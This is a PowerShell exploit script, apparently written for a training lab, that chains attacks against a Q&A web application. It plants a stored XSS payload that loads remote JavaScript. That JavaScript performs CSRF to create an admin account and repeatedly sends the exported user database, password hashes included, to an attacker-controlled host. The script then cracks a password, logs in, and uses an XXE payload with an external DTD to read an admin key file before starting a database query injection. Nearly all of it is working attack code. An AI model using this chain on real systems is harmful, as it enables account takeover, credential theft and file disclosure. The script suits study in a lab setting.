$attacker_ip = '192.168.119.123';
$target_ip = '192.168.123.251';
$username = 'zinhart';
$javascript = @"
const attacker_ip = '$attacker_ip';
const host = 'answers';
const host_ip = '$target_ip';

username = '$username'
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(``http://`${host_ip}/admin/users/create``, config);


// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
setInterval(() => {
  extractHash(``http://`${host_ip}/admin/export``, config);
}, 100);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/exfil?value=`` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/error?value=`` + error, {
        mode: "cors",
      });   
  });
}

// extract hash
function extractHash(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
      mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
      mode: "cors",
      });
    if(response.status < 400) {
      let xml_string = await response.text();
      let parser = new DOMParser();
      let xmlDoc = parser.parseFromString(xml_string,"text/xml");
      let users = xmlDoc.getElementsByTagName("user");
      let hash='';
      for(let i = 0; i < users.length; ++i) {
        fetch(``http://`${attacker_ip}/exfil?value=`` + encodeURIComponent(xmlDoc.getElementsByTagName("user")[i].innerHTML), {
          mode: "cors",
        });
      }
  }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/error?value=`` + error, {
        mode: "cors",
      });   
  });
}
"@
$csrf_payload = New-Item -ItemType File -Path "create-admin-user-csrf.js" -Value $javascript -Force;
$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.Name)'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"

$start_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
$end_time = '';
Write-Output "Webserver Started, Start simulation";


# Start cors server and wait for exfile data
$server_job = Start-Job -ScriptBlock { python3 ./simple-cors-http-server.py 80 }
$server_logs = '';
$hash = '';
while($True) {
  $server_logs = Receive-Job -Job $server_job -Keep *>&1;
  $magic_string = $server_logs | Select-String -Pattern ".*$username.*";
  # sls -Pattern '(\?exfil=hash&value=[^\s]+)'
  if($magic_string.Matches.Length -gt 0) {
    #$magic_string.Matches
    $match = $magic_string.Matches.value | Select-String -Pattern '(exfil\?value=[^\s]+)';
    #$match.Matches
    $decodedURLParameters = [System.Web.HttpUtility]::UrlDecode($match.Matches.value)
    $hash = ($decodedURLParameters | Select-String -Pattern '<password>(.*?)</password>').Matches.groups[1].value;
    #$hash
    $end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
    break;
  }
}


## run password cracker
write-output "Username: $username";
javac PasswordCracker.java;
$pw_crack_res = java PasswordCracker.java "$start_time" "$end_time" "$hash";
$cracked_pw = $pw_crack_res -replace '.*\s';
Write-Output "Found Password: $cracked_pw";
$cracked_pw = [System.Web.HttpUtility]::UrlEncode($cracked_pw); 
# attempt to login to the webapp, note that the session variable is Session
$res = Invoke-WebRequest -uri http://answers/login -Method Post -Body "username=$username&password=$cracked_pw&submit=Submit" -SessionVariable 'Session';
$login_success = $res.rawcontent | Select-String -Pattern "Welcome $username";
# login success proceed with admin key extractions then large object injection
if($login_success.Matches.Count -gt 0) {
  Write-Output "Login Success";
# admin key extraction
$xxe_payload = @"
<!DOCTYPE data [
<!ENTITY % start `"<![CDATA[`">
<!ENTITY % file SYSTEM `"file:///home/student/adminkey.txt`" >
<!ENTITY % end `"]]>`">
<!ENTITY % dtd SYSTEM `"http://$attacker_ip/wrapper.dtd`" >
%dtd;
]>
<database><categories><category><name>&wrapper;</name></category></categories></database>
"@
  $xxe_wrapper = New-Item -ItemType File -Path "wrapper.dtd" -Value '<!ENTITY wrapper "%start;%file;%end;">' -Force;
  $req_body = "preview=true&xmldata=" + [System.Web.HttpUtility]::UrlEncode($xxe_payload);
  $res = Invoke-WebRequest -Uri http://answers/admin/import -Method Post -Body $req_body -Websession $Session -Proxy http://localhost:8080/;
  # wait for request for wrapper.dtd
  $admin_key = '';
  while($True) {
    $server_logs = Receive-Job -Job $server_job -Keep *>&1;
    $magic_string = $server_logs | Select-String -Pattern ".*wrapper.dtd.*";
    if($magic_string.Matches.Length -gt 0) {
      # Admin Key Extraction
      Write-Output "Received request for wrapper.dtd";
      $admin_key = $res.rawcontent | Select-String -Pattern '\[.*\s';
      $admin_key = $admin_key.Matches.value -replace '\[CDATA\[', '';
      Write-Output "Admin Key: $admin_key"

      # large object injection
      $query = 'select version();';
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$query" -Websession $Session;
      #$res.content;
      break;
    }
  }
  
}
else {
  $login_success.Matches;
}
#$server_logs
#Write-Output $start_time $end_time $hash;

# cleanup
Remove-Job -Job $server_job -Force;
Remove-Item -Path $csrf_payload.Name;
Remove-Item '*.class';
Remove-Item 'wrapper.dtd';
